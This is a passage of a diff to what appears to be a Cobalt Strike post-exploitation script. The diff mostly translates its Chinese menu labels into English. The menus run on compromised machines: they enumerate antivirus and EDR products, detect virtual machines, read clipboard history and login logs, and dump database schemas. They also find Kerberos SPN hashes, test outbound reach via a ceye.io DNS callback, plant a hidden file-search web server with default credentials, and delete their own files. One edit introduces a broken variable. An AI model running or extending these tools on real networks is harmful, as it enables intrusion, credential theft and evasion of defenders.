-				"QHActiveDefense.exe" => "360 Total Security (360国际版)",
-				"QHWatchdog.exe" => "360 Total Security (360国际版)",
-				"QHSafeTray.exe" => "360 Total Security (360国际版)",
-				"QHSafeMain.exe" => "360 Total Security (360国际版)"
+				"360EntClient.exe" => "Tianqing EDR Agent",
+				"edr_sec_plan.exe" => "Sangcon EDR Agent",
+				"edr_monitor.exe" => "Sangcon EDR Agent",
+				"edr_agent.exe" => "Sangcon EDR Agent",
+				"ESCCControl.exe" => "Venus EDR Agent",
+				"ESCC.exe" => "Venus EDR Agent",
+				"ESAV.exe" => "Venus EDR Agent",
+				"ESCCIndex.exe" => "Venus EDR Agent",
+				"AliYunDun.exe" => "Aliyun Yundun",
+				"wdswfsafe.exe" => "360 Antivirus-Net Shield",
+				"TopsecMain.exe" => "Topsec Terminal Defense",
+				"TopsecTray.exe" => "Topsec Terminal Defense",
+				"YDLive.exe" => "Tencent Cloud-Cloud Mirror",
+				"YDService.exe" => "Tencent Cloud-Cloud Mirror",
+				"TitanAgent.exe" => "Sky Eye Cloud Mirror",
+				"TitanMonitor.exe" => "Tianyan Cloud Mirror",
+				"gse_win_daemon.exe" => "Blue Whale Agent",
+				"gse_win_agent.exe" => "Blue Whale Agent",
+				"QHActiveDefense.exe" => "360 Total Security (360 International Edition)",
+				"QHWatchdog.exe" => "360 Total Security (360 International Edition)",
+				"QHSafeTray.exe" => "360 Total Security (360 International Edition)",
+				"QHSafeMain.exe" => "360 Total Security (360 International Version)"
 				);
 			bshell($1,"tasklist /SVC && echo AntiVirusCheckComplete");
 			$bid = $1;
@@ -1023,7 +1023,7 @@ menu "☆ 信息收集" {
 						}
 					}
 				$ip = binfo($1)['internal'];
-				%beacon_llist_av[$ip] = $av; 
+				%beacon_llist_off[$ip] = $off;
 				}else{
 					exit();
 				}
@@ -1033,7 +1033,7 @@ menu "☆ 信息收集" {
 				$beacon_ip = $2['internal'];
 				$av_list = %beacon_llist_av[$beacon_ip];
 				if ($av_list eq ""){
-					%beacon_llist_av[$beacon_ip] = "暂未发现杀软"
+					%beacon_llist_av[$beacon_ip] = "No antivirus found yet"
 				}
 				($computer, $user, $pid, $barch) = values($2, @('computer', 'user', 'pid', 'barch'));
 				if ("x86" eq $barch) {
@@ -1050,8 +1050,8 @@ menu "☆ 信息收集" {
 
 		}
 	}
-	item "Check VM（虚拟机检测）" {
-		blog($1, "\c9=========== Check VM（虚拟机检测） ==========");
+	item "Check VM" {
+		blog($1, "\c9=========== Check VM (virtual machine detection) ==========");
 		local('$bid');
 		foreach $bid ($1){
 			binput($1, "powershell-import Check-VM.ps1");
@@ -1060,23 +1060,23 @@ menu "☆ 信息收集" {
 			bpowershell($1, "Check-VM");
 		}
 	}
-	item "SharpGetInfo（一键收集）" {
-		blog($1, "\c9=========== SharpGetInfo（一键收集） ==========");
+	item "SharpGetInfo (one-click collection)" {
+		blog($1, "\c9=========== SharpGetInfo (one-click collection) ==========");
 		bexecute_assembly($1, script_resource('/scripts/InfoCollect/Ladon.exe'), "GetInfo");
 	}
-	item "SharpListRDP（RDP记录）" {
-		blog($1, "\c9=========== SharpListRDP（RDP记录查询） ==========");
+	item "SharpListRDP (RDP record)" {
+		blog($1, "\c9=========== SharpListRDP (RDP record query) ==========");
 		bexecute_assembly($1, script_resource('/scripts/InfoCollect/LRC.exe'));
 	}	
-	menu "其他主机信息收集" {
-		item "SharpNetCheck (探测出网)" {
-			blog($1, "\c9=========== SharpNetCheck (探测出网) ==========");
+	menu "Other host information collection" {
+		item "SharpNetCheck (detection net)" {
+			blog($1, "\c9=========== SharpNetCheck (detecting the net) ==========");
 			$bid = $1['@'];
 			$dialog = dialog("SharpNetCheck", %(host => "ceye.io",,type => "all",bid => $bid), &SharpNetCheck);
-			dialog_description($dialog,"在 Dnslog 中回显内网 IP 地址和计算机名，可实现内网中的快速定位可出网机器。。项目地址：https://github.com/uknowsec/SharpNetCheck");
+			dialog_description($dialog,"Echoing the internal network IP address and computer name in Dnslog can realize the rapid positioning of the network-exiting machine in the internal network. Project address: https://github.com/uknowsec/SharpNetCheck");
 			drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","-all"));
 			drow_text($dialog, "host", "host/ip:  ");
-			dbutton_action($dialog, "运行");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpNetCheck {
@@ -1084,12 +1084,12 @@ menu "☆ 信息收集" {
 			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpNetCheck.exe"), $arg);
 		}
 
-		item "SharpChassisType（判断主机类型）" {
-			blog($1, "\c9=========== SharpChassisType（判断主机类型） ==========");
+		item "SharpChassisType (judging host type)" {
+			blog($1, "\c9=========== SharpChassisType (judge host type) ==========");
 			$bid = $1['@'];
 			$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
-			dialog_description($dialog,"用于判断当前机器类型(桌面计算机、笔记本等判断)。项目地址：https://github.com/RcoIl/CSharp-Tools/");
-			dbutton_action($dialog, "运行");
+			dialog_description($dialog," used to judge the current machine type (desktop computer, notebook, etc.). Project address: https://github.com/RcoIl/CSharp-Tools/");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpChassisType{
@@ -1097,42 +1097,42 @@ menu "☆ 信息收集" {
 		}
 
 
-		item "SharpEventLog（获取系统登录日志）" {
-			blog($1, "\c9=========== SharpEventLog（获取系统登录日志） ==========");
+		item "SharpEventLog(get system log log)" {
+			blog($1, "\c9=========== SharpEventLog (get system login log) ==========");
 			$bid = $1;
 			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
-			dialog_description($dialog, "读取登录过本机的登录失败或登录成功（4624，4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。项目地址：https://github.com/uknowsec/SharpEventLog");
+			dialog_description($dialog, "Read all the computer information of failed logins or successful logins (4624, 4625) that have logged in to this machine, and quickly locate operation and maintenance managers during intranet penetration. Project address: https://github.com /uknowsec/SharpEventLog");
 			drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
-			dbutton_action($dialog, "运行");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpEventLog {
 			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpEventLog.exe"), $3['EventLogType']);
 		}
 
-		item "SharpCheckInfo（获取多项主机信息）" {
-			blog($1, "\c9=========== SharpCheckInfo（获取多项主机信息） ==========");
+		item "SharpCheckInfo (get multiple host information)" {
+			blog($1, "\c9=========== SharpCheckInfo (obtain multiple host information) ==========");
 			$bid = $1;
 			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
-			dialog_description($dialog, "收集目标主机信息，包括最近打开文件，系统环境变量和回收站文件等等。项目地址：https://github.com/uknowsec/SharpCheckInfo");
+			dialog_description($dialog, "Collect target host information, including recently opened files, system environment variables and recycle bin files, etc. Project address: https://github.com/uknowsec/SharpCheckInfo");
 			drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
-			dbutton_action($dialog, "运行");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpCheckInfo {
 			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpCheckInfo.exe"), $3['Type']);
 		}
 
-		item "SharpSQLDump（快速列出数据库数据）" {
-			blog($1, "\c9=========== SharpSQLDump（快速列出数据库数据） ==========");
+		item "SharpSQLDump (quickly list database data)" {
+			blog($1, "\c9=========== SharpSQLDump (quickly list database data) ==========");
 			$bid = $1['@'];
 			$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
-			dialog_description($dialog, "内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。项目地址：https://github.com/uknowsec/SharpSQLDump");
+			dialog_description($dialog, "Quickly obtain all database names, table names, and column names of the database during intranet penetration. After specific judgments, go to the data to save time. Applicable to mysql, mssql. Project address: https://github.com /uknowsec/SharpSQLDump");
 			drow_text($dialog, "host", "host:  ");
 			drow_text($dialog, "username", "username:  ");
 			drow_text($dialog, "password", "password:  ");
 			drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
-			dbutton_action($dialog, "运行");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpSQLDump {
@@ -1140,46 +1140,46 @@ menu "☆ 信息收集" {
 			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpSQLDump.exe"), $arg);
 		}
 
-		item "SharpClipHistory（获取win10剪切板）" {
-			blog($1, "\c9=========== SharpClipHistory（获取win10剪切板） ==========");
+		item "SharpClipHistory (get win10 clipboard)" {
+			blog($1, "\c9=========== SharpClipHistory (get win10 clipboard) ==========");
 			$bid = $1;
 			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
-			dialog_description($dialog, "【开启 enableHistory 后直接运行即可读取】可用于从1809 Build版本开始读取Windows 10中用户剪贴板历史记录的内容。项目地址：https://github.com/FSecureLABS/SharpClipHistory");
+			dialog_description($dialog, "[Run directly after enabling enableHistory to read] can be used to read the contents of the user's clipboard history in Windows 10 starting from the 1809 Build version. Project address: https://github.com/FSecureLABS/ SharpClipHistory");
 			drow_combobox($dialog, "Type", "Type:", @("","--help","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
-			dbutton_action($dialog, "运行");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpClipHistory {
 			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpClipHistory.exe"), $3['Type']);
 		}
 
-		item "SharpAVKB（杀软和补丁对比）" {
-			blog($1, "\c9=========== SharpAVKB（杀软和补丁对比） ==========");
+		item "SharpAVKB (comparison of antivirus and patch)" {
+			blog($1, "\c9=========== SharpAVKB (comparison of antivirus and patch) ==========");
 			$bid = $1;
 			$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
-			dialog_description($dialog, "Windows杀软对比和补丁号对比。项目地址：https://github.com/uknowsec/SharpAVKB");
+			dialog_description($dialog, "Windows antivirus comparison and patch number comparison. Project address: https://github.com/uknowsec/SharpAVKB");
 			drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
-			dbutton_action($dialog, "运行");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpAVKB {
 			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpAVKB.exe"), $3['type']);
 		}
 
-		item "SharpEDRChecker（获取EDR信息）" {
-			blog($1, "\c9=========== SharpEDRChecker（获取EDR信息） ==========");
+		item "SharpEDRChecker (get EDR information)" {
+			blog($1, "\c9=========== SharpEDRChecker (get EDR information) ==========");
 			$bid = $1['@'];
-			btask($bid, "检查正在运行的进程，进程元数据，加载到当前进程中的Dll以及每个DLL元数据，通用安装目录，已安装的服务和每个服务二进制元数据，已安装的驱动程序和每个驱动程序元数据，所有这些都存在已知的防御性产品，例如AV，EDR和日志记录工具。还可以通过其元数据检查来捕获隐藏的EDR。项目地址：https://github.com/PwnDexter/SharpEDRChecker", "");
+			btask($bid, "Check the running process, process metadata, DLL loaded into the current process and per-DLL metadata, common installation directory, installed services and per-service binary metadata, installed drivers Program and per-driver metadata, all of which exist known defensive products such as AV, EDR, and logging tools. Can also catch hidden EDR through its metadata inspection. Project address: https://github .com/PwnDexter/SharpEDRChecker", "");
 			bexecute_assembly($1, script_resource("/scripts/InfoCollect/SharpEDRChecker.exe"), "");
 		}
-		item "SharpDir（文件搜索）" {
-			blog($1, "\c9=========== SharpDir（文件搜索） ==========");
+		item "SharpDir(file search)" {
+			blog($1, "\c9=========== SharpDir (file search) ==========");
 			$bid = $1['@'];
-			$dialog = dialog("文件搜索", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
-			dialog_description($dialog, "文件搜索，三种搜索方式，指定文件名、制定文件名搜索后缀、搜索指定后缀文件。项目地址：https://github.com/jnqpblc/SharpDir");
+			$dialog = dialog("File Search", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
+			dialog_description($dialog, "File search, three search methods, specify file name, specify file name search suffix, search specified suffix file. Project address: https://github.com/jnqpblc/SharpDir");
 			drow_text($dialog, "path", "path:  ");
 			drow_text($dialog, "file", "file:  ");
-			dbutton_action($dialog, "运行");
+			dbutton_action($dialog, "Run");
 			dialog_show($dialog);
 		}
 		sub SharpDir {
@@ -1187,14 +1187,14 @@ menu "☆ 信息收集" {
 			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpDir.exe"), $arg);
 		}
 
-		menu "Everything（建立 http 服务文件搜索）" {
-			item "上传 Everything" {
-			blog($1, "\c9=========== 上传 Everything ==========");
+		menu "Everything (build http service file search)" {
+			item "Upload Everything" {
+			blog($1, "\c9=========== Upload Everything ==========");
 				$bid = $1;
 				$dialog = dialog("上传 Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
-				dialog_description($dialog, "运行无任何弹窗，软件地址：https://www.voidtools.com/zh-cn/");
-				drow_text($dialog, "UploadPath",  "上传路径: ");
-				dbutton_action($dialog, "上传");
+				dialog_description($dialog, "Run without any pop-up window, software address: https://www.voidtools.com/zh-cn/");
+				drow_text($dialog, "UploadPath", "Upload path: ");
+				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
 			}
 			sub evething {
@@ -1203,27 +1203,27 @@ menu "☆ 信息收集" {
 				bupload($bid, script_resource("/scripts/InfoCollect/everything/Everything.ini"));
 			}
 
-			item "运行 Everything" {
-				blog($1, "\c9=========== 运行 Everything ==========");
+			item "Run Everything" {
+				blog($1, "\c9=========== Run Everything ===========");
 				$bid = $1['@'];
-				$Dialog = dialog("运行 Evething",%(bid => $bid),&Evething_run);
-				dialog_description($Dialog, "运行无任何弹窗及托盘显示，自动启用http服务。端口：65535，用户：admin，密码：admin@123");
-				btask($bid, "运行无任何弹窗及托盘显示，自动启用http服务。访问web服务：http://ip:65535，用户：admin，密码：admin@123", "");
-				dbutton_action($Dialog, "运行");
+				$Dialog = dialog("Run Evething",%(bid => $bid),&Evething_run);
+				dialog_description($Dialog, "Run without any pop-up window and tray display, automatically enable http service. Port: 65535, user: admin, password: admin@123");
+				btask($bid, "Run without any pop-up window and tray display, automatically enable http service. Access web service: http://ip:65535, user: admin, password: admin@123", "");
+				dbutton_action($Dialog, "Run");
 				dialog_show($Dialog);
 			}
 			sub Evething_run{
 				bshell($bid, "Everything.exe");
 			}
-			item "停止 Everything" {
-				blog($1, "\c9=========== 停止 Everything ==========");
+			item "Stop Everything" {
+				blog($1, "\c9=========== Stop Everything ==========");
 				local('$bid');
 				foreach $bid ($1){
 					bshell($1, "taskkill -f /im Everything.exe");
 				}
 			}
-			item "删除 Everything" {
-				blog($1, "\c9=========== 删除 Everything ==========");
+			item "Delete Everything" {
+				blog($1, "\c9============ Delete Everything ==========");
 				local('$bid');
 				foreach $bid ($1){
 					bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini");
@@ -1232,26 +1232,26 @@ menu "☆ 信息收集" {
 		}
 	}
 	separator();
-	menu "Netview（WinAPI）" {
-		item "上传 netview" {
-		blog($1, "\c9=========== 上传 netview ==========");
+	menu "Netview (WinAPI)" {
+		item "upload netview" {
+		blog($1, "\c9=========== upload netview ==========");
 		$bid = $1;
-		$dialog = dialog("上传 netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
-		dialog_description($dialog, "Netview 使用 WinAPI 调用枚举系统，绝大部分功能不需要管理员权限。项目地址：https://github.com/mubix/netview");
-		drow_text($dialog, "UploadPath",  "上传路径: ");
-		dbutton_action($dialog, "上传");
+		$dialog = dialog("Upload netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
+		dialog_description($dialog, "Netview uses WinAPI to call the enumeration system, and most functions do not require administrator privileges. Project address: https://github.com/mubix/netview");
+		drow_text($dialog, "UploadPath", "Upload path: ");
+		dbutton_action($dialog, "Upload");
 		dialog_show($dialog);
 		}
 		sub netview {
 		bcd($bid, $3['UploadPath']);
 		bupload($bid, script_resource("/scripts/InfoCollect/netview.exe"));
 		}
-		item "运行 netview" {
-		blog($1, "\c9=========== 运行 netview ==========");
+		item "run netview" {
+		blog($1, "\c9=========== run netview ==========");
 		$bid = $1['@'];
-		$Dialog = dialog("运行netview",%(domain => "xxx.com",bid => $bid),&netview_run);
+		$Dialog = dialog("Run netview",%(domain => "xxx.com",bid => $bid),&netview_run);
 		drow_text($Dialog, "domain", "domain: ");
-		dbutton_action($Dialog, "运行");
+		dbutton_action($Dialog, "Run");
 		dialog_show($Dialog);
 		}
 		sub netview_run{
@@ -1259,8 +1259,8 @@ menu "☆ 信息收集" {
 		$Name = $3['domain'];
 		bshell($bid, "netview.exe -d  $+ $Name");
 		}
-		item "删除 netview" {
-		blog($1, "\c9=========== 删除 netview ==========");
+		item "delete netview" {
+		blog($1, "\c9============ delete netview ==========");
 		local('$bid');
 		foreach $bid ($1){
 			bshell($1, "del /f /s /q netview.exe");
@@ -1268,35 +1268,35 @@ menu "☆ 信息收集" {
 		}
 	}
 
-	menu "Powerview 2008查询"{
-		item "上传AD模块" {
-			blog($1, "\c9=========== 上传AD模块 ==========");
+	menu "Powerview 2008 query"{
+		item "Upload AD module" {
+			blog($1, "\c9=========== Upload AD module==========");
 			bupload($bid, script_resource("/scripts/InfoCollect/AD.dll"));
 		}
-		item "导入 Powerview" {
-			blog($1, "\c9=========== 导入 Powerview ==========");
+		item "Import Powerview" {
+			blog($1, "\c9=========== import Powerview ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
-				blog2($bid, "powerview导入测试");
+				blog2($bid, "powerview import test");
 				bpowershell($bid, "Import-Module .\\AD.dll;Get-DomainController");
 			}
 		}
-		item "查看指定的用户信息" {
-			blog($1, "\c9=========== 查看指定的用户信息 ==========");
+		item "View the specified user information" {
+			blog($1, "\c9=========== View the specified user information ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
-				$dialog = dialog("查看指定用户", %(username => ""), &getuser);
-				dialog_description($dialog, "powerview查看指定用户的信息");
-				drow_text($dialog, "username", "用户: ");
+				$dialog = dialog("View the specified user", %(username => ""), &getuser);
+				dialog_description($dialog, "powerview view the information of the specified user");
+				drow_text($dialog, "username", "user: ");
 				dbutton_action($dialog, "QUERY");
 				dialog_show($dialog);
 			}
 		}
 
-		item "所有用户最后一个错误的密码尝试" {
-			blog($1, "\c9=========== 所有用户最后一个错误的密码尝试 ==========");
+		item "Last bad password attempt for all users" {
+			blog($1, "\c9=========== last bad password attempt for all users ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1305,13 +1305,13 @@ menu "☆ 信息收集" {
 		}
 
 
-		item "查询某个组的用户" {
-			blog($1, "\c9=========== 查询某个组的用户 ==========");
+		item "Query users of a group" {
+			blog($1, "\c9===========Query users of a certain group==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
-				$dialog = dialog("查看指定组的所有用户", %(groupname => ""), &groupquery);
-				dialog_description($dialog, "powerview查看指定组的所有用户");
+				$dialog = dialog("View all users of the specified group", %(groupname => ""), &groupquery);
+				dialog_description($dialog, "powerview view all users of the specified group");
 				drow_text($dialog, "groupname", "组名: ");
 				dbutton_action($dialog, "QUERY");
 				dialog_show($dialog);
@@ -1319,8 +1319,8 @@ menu "☆ 信息收集" {
 
 		}
 
-		item "域控机器查询" {
-			blog($1, "\c9=========== 域控机器查询 ==========");
+		item "Domain Control Machine Query" {
+			blog($1, "\c9=========== Domain control machine query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1328,8 +1328,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "获取域级别" {
-			blog($1, "\c9=========== 获取域级别 ==========");
+		item "Get Domain Level" {
+			blog($1, "\c9=========== get field level==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1337,8 +1337,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "寻找域内所有计算机和计算机对应的DNS" {
-			blog($1, "\c9=========== 寻找域内所有计算机和计算机对应的DNS ==========");
+		item "Find all computers in the domain and the DNS corresponding to the computer" {
+			blog($1, "\c9=========== Find all computers and DNS corresponding to computers in the domain ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1346,8 +1346,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "寻找域内所有用户" {
-			blog($1, "\c9=========== 寻找域内所有用户 ==========");
+		item "Find all users in the domain" {
+			blog($1, "\c9=========== Find all users in the domain ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1355,8 +1355,8 @@ menu "☆ 信息收集" {
 			}
 		}
  
-		item "寻找kerberos服务用户" {
-			blog($1, "\c9=========== 寻找kerberos服务用户 ==========");
+		item "Looking for kerberos service user" {
+			blog($1, "\c9=========== Looking for kerberos service users ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1364,8 +1364,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "无委派计算机查询" {
-			blog($1, "\c9=========== 无委派计算机查询 ==========");
+		item "No delegation computer query" {
+			blog($1, "\c9=========== No delegation computer query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1373,8 +1373,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "约束委派用户查询" {
-			blog($1, "\c9=========== 约束委派用户查询 ==========");
+		item "Constrained Delegation User Query" {
+			blog($1, "\c9=========== constrained delegation user query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1382,8 +1382,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "域用户不要求kerberos验证身份查询" {
-			blog($1, "\c9=========== 域用户不要求kerberos验证身份查询 ==========");
+		item "Domain users do not require kerberos authentication identity query" {
+			blog($1, "\c9=========== domain users do not require kerberos authentication query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1391,21 +1391,21 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "获取指定SPN用户的hash" {
-			blog($1, "\c9=========== 获取指定SPN用户的hash ==========");
+		item "Get the hash of the specified SPN user" {
+			blog($1, "\c9=========== Get the hash of the specified SPN user ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
-				$dialog = dialog("获取指定SPN用户的hash", %(spnusername => ""), &spnuserquery);
-				dialog_description($dialog, "powerview获取指定SPN用户的hash");
-				drow_text($dialog, "spnusername", "用户: ");
+				$dialog = dialog("Get the hash of the specified SPN user", %(spnusername => ""), &spnuserquery);
+				dialog_description($dialog, "powerview gets the hash of the specified SPN user");
+				drow_text($dialog, "spnusername", "User: ");
 				dbutton_action($dialog, "QUERY");
 				dialog_show($dialog);
 			}
 		}
 
-		item "枚举有价值(高权限组)的SPN用户" {
-			blog($1, "\c9=========== 枚举有价值(高权限组)的SPN用户 ==========");
+		item "enumerate valuable (high authority group) SPN users" {
+			blog($1, "\c9=========== enumerate valuable (high authority group) SPN users ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport($1, $modulename);
 			foreach $bid ($1){
@@ -1415,7 +1415,7 @@ menu "☆ 信息收集" {
 		}
 		sub moduleimport{
 			foreach $bid ($1){
-				blog($bid, "导入脚本: $modulename");
+				blog($bid, "Import script: $modulename");
 				bpowershell_import($bid, script_resource($modulename));
 			}
 		}
@@ -1433,31 +1433,31 @@ menu "☆ 信息收集" {
 		}
 	}
 
-	menu "Powerview 2012查询" {
-		item "导入 Powerview" {
-			blog($1, "\c9=========== 导入 Powerview ==========");
+	menu "Powerview 2012 query" {
+		item "Import Powerview" {
+			blog($1, "\c9=========== import Powerview ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
-				blog2($bid, "powerview导入测试");
+				blog2($bid, "powerview import test");
 				bpowershell($bid, "Get-DomainController");
 			}
 		}
-		item "查看指定的用户信息" {
-			blog($1, "\c9=========== 查看指定的用户信息 ==========");
+		item "View the specified user information" {
+			blog($1, "\c9=========== View the specified user information ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
-				$dialog = dialog("查看指定用户", %(username => ""), &getuser);
-				dialog_description($dialog, "powerview查看指定用户的信息");
-				drow_text($dialog, "username", "用户: ");
+				$dialog = dialog("View the specified user", %(username => ""), &getuser);
+				dialog_description($dialog, "powerview view the information of the specified user");
+				drow_text($dialog, "username", "user: ");
 				dbutton_action($dialog, "QUERY");
 				dialog_show($dialog);
 			}
 		}
 
-		item "所有用户最后一个错误的密码尝试" {
-			blog($1, "\c9=========== 所有用户最后一个错误的密码尝试 ==========");
+		item "Last bad password attempt for all users" {
+			blog($1, "\c9=========== last bad password attempt for all users ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1466,13 +1466,13 @@ menu "☆ 信息收集" {
 		}
 
 
-		item "查询某个组的用户" {
-			blog($1, "\c9=========== 查询某个组的用户 ==========");
+		item "Query users of a group" {
+			blog($1, "\c9===========Query users of a certain group==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
-				$dialog = dialog("查看指定组的所有用户", %(groupname => ""), &groupquery);
-				dialog_description($dialog, "powerview查看指定组的所有用户");
+				$dialog = dialog("View all users of the specified group", %(groupname => ""), &groupquery);
+				dialog_description($dialog, "powerview view all users of the specified group");
 				drow_text($dialog, "groupname", "组名: ");
 				dbutton_action($dialog, "QUERY");
 				dialog_show($dialog);
@@ -1480,8 +1480,8 @@ menu "☆ 信息收集" {
 
 		}
 
-		item "域控机器查询" {
-			blog($1, "\c9=========== 域控机器查询 ==========");
+		item "Domain Control Machine Query" {
+			blog($1, "\c9=========== Domain control machine query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1489,8 +1489,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "获取域级别" {
-			blog($1, "\c9=========== 获取域级别 ==========");
+		item "Get Domain Level" {
+			blog($1, "\c9=========== get field level==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1498,8 +1498,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "寻找域内所有计算机和计算机对应的DNS" {
-			blog($1, "\c9=========== 寻找域内所有计算机和计算机对应的DNS ==========");
+		item "Find all computers in the domain and the DNS corresponding to the computer" {
+			blog($1, "\c9=========== Find all computers and DNS corresponding to computers in the domain ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1507,8 +1507,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "寻找域内所有用户" {
-			blog($1, "\c9=========== 寻找域内所有用户 ==========");
+		item "Find all users in the domain" {
+			blog($1, "\c9=========== Find all users in the domain ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1516,8 +1516,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "寻找kerberos服务用户" {
-			blog($1, "\c9=========== 寻找kerberos服务用户 ==========");
+		item "Looking for kerberos service user" {
+			blog($1, "\c9=========== Looking for kerberos service users ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1525,8 +1525,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "无委派计算机查询" {
-			blog($1, "\c9=========== 无委派计算机查询 ==========");
+		item "No delegation computer query" {
+			blog($1, "\c9=========== No delegation computer query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1534,8 +1534,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "约束委派用户查询" {
-			blog($1, "\c9=========== 约束委派用户查询 ==========");
+		item "Constrained Delegation User Query" {
+			blog($1, "\c9=========== constrained delegation user query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1543,8 +1543,8 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "域用户不要求kerberos验证身份查询" {
